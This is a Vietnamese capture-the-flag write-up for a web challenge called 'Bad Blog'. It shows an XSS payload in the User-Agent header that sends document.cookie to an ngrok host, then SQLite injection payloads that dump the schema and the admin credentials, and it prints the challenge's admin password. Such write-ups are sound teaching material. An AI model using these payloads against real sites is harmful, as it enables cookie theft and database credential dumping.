Bad Blog
===
**Category:** Web

**Author:** @congon4tor#2334

**Point:**

### Description
```
We just added analytics to our blogging website. Check them out!
```

### Overview
- Đầu tiên chúng ta vào trang web thì thấy có form đăng nhập và đăng kí. Thử đăng kí với username là admin thì nhận được thông báo là đã được sử dụng vì vậy mình đoán là phải access admin. 
- Đăng kí và đăng nhập với tài khoản bất kì thì chúng ta nhận được một trang tạo mới các bài blog và xem lại những gì bạn đăng và có cả những bài viết của admin. Mình thử tạo mới một bài và thử xss ở phần content với payload `<script>alert(1);</script>` thì có thể trigger được xss nhưng sau đó mình fetch tới url của mình thì lại không request, có vẻ như không có bot để visit
- Sau một khoảng thời gian stuck thì mình sử dụng dirsearch xem đường dẫn nào có thể sử dụng hay không thì thấy có `/profile` và nhận được kết quả 
![image](https://user-images.githubusercontent.com/54855855/111077195-3173ff80-8522-11eb-9c48-7cb27894c5a9.png)

### Solution
- Như những gì chúng ta tìm được ở tên thì thấy được răng ở profile là hiện tên bài post những ai ghé thăm và `User Agent`. Tới đây mình lại nghĩ tới việc thử xxs ở chỗ `User Agent` xem coi có thể trigger và có bot visit hay không. Ở đây mình dùng burp để hỗ trợ việc này
- Sau khi thử với payload
```
User-Agent: <script>document.location=' http://eb46a8d257bc.ngrok.io?c='+document.cookie;</script>
```
thì nhận được kết quả khá bất ngờ là đó là dump ra lỗi của sqlite
![image](https://user-images.githubusercontent.com/54855855/111077475-7fd5ce00-8523-11eb-8f45-fe516bc93261.png)
- Vậy bây giờ mình cùng bắt đầu từ sql injection ở chỗ User-Agent. Chúng ta thấy lỗi của chương trình in ra nó kèm theo query của sql
```
insert into visit (post_id, user_id, ua) values (5,2,'&lt;script&gt;document.location=' http://eb46a8d257bc.ngrok.io?c='+document.cookie;&lt;/script&gt;');
```
Qua query ở trên chúng ta thấy được input của chúng ta nhập vào `User-Agent` thì sẽ nằm ở tham số thứ 3 của values vậy bây giờ chúng ta chỉ cần injection vào nó để dump ra table và cột của database
- Query dump ra cột và table
```
'||(SELECT sql FROM sqlite_master))-- -
```
Và đây là cấu trúc của database
![image](https://user-images.githubusercontent.com/54855855/111077796-0c34c080-8525-11eb-811d-c1a3fb9596bd.png)
Bây giờ chúng ta chỉ cần dump ra username và password của admin
```
'||(SELECT username FROM user limit 1))-- -
```
password của admin `J3H8cqMNWxH68mTj`

###### Payload
- Đăng nhập với admin với password `J3H8cqMNWxH68mTj` sẽ thấy flag.